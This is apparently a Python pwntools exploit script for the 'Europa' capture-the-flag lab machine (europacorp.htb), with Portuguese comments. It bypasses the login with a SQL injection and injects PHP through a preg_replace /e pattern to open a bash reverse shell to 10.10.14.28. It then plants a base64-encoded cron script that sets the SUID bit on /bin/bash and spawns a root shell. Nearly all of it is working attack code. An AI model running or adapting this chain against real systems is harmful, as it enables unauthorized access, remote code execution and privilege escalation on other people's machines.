#!/usr/bin/python3
# coding = utf-8

from pwn import *
import requests, urllib3, pdb, re, time

def def_handler(sig, frame):
	print("\n\nSaindo...\n\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variaveis_globais
main_url = "https://admin-portal.europacorp.htb/login.php" 
main_rce = "https://admin-portal.europacorp.htb/tools.php"
lport = 4321

def makeRequest():
	s = requests.session()
	s.verify = False

	urllib3.disable_warnings()

	post_data = {
		"email": "' or 1=1 LIMIT 1;#",
		"password": "test"
	}

	r = s.post(main_url, data=post_data)

	# print(r.text)

	post_data = {
		"pattern": "/hack/e",
		"ipaddress": "system('bash -c \"bash -i >& /dev/tcp/10.10.14.28/4321 0>&1\"')",
		"text": "test hack"
	}

	r = s.post(main_rce, data=post_data)

	# pdb.set_trace()

	# regex = (re.findall(r'<p>test (.*)', r.text, re.DOTALL)[0]).replace('</p>\r\n                        <a href="tools.php" class="btn btn-lg btn-success btn-block">New Configuration</a>\r\n                                    </div>\r\n                <!-- /.panel-body -->\r\n            </div>\r\n        </div>\r\n        <!-- /.row -->\r\n\r\n    </div>\r\n    <!-- /#page-wrapper -->\r\n\r\n</div>\r\n<!-- /#wrapper -->\r\n\r\n<!-- jQuery -->\r\n<script src="/vendor/jquery/jquery.min.js"></script>\r\n\r\n<!-- Bootstrap Core JavaScript -->\r\n<script src="/vendor/bootstrap/js/bootstrap.min.js"></script>\r\n\r\n<!-- Metis Menu Plugin JavaScript -->\r\n<script src="/vendor/metisMenu/metisMenu.min.js"></script>\r\n\r\n<!-- Morris Charts JavaScript -->\r\n<script src="/vendor/raphael/raphael.min.js"></script>\r\n<script src="/vendor/morrisjs/morris.min.js"></script>\r\n<script src="/data/morris-data.js"></script>\r\n\r\n<!-- Custom Theme JavaScript -->\r\n<script src="/dist/js/sb-admin-2.js"></script>\r\n\r\n</body>\r\n\r\n</html>\r\n', "")

	# print(regex)

if __name__ == '__main__':

	try:
		threading.Thread(target=makeRequest, args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()

	shell.sendline("echo IyEvYmluL2Jhc2gKCmNobW9kIDQ3NTUgL2Jpbi9iYXNoCg== | base64 -d > /var/www/cmd/logcleared.sh")
	shell.sendline("chmod +x /var/www/cmd/logcleared.sh")
	time.sleep(65)
	shell.sendline("bash -p")
	shell.interactive()
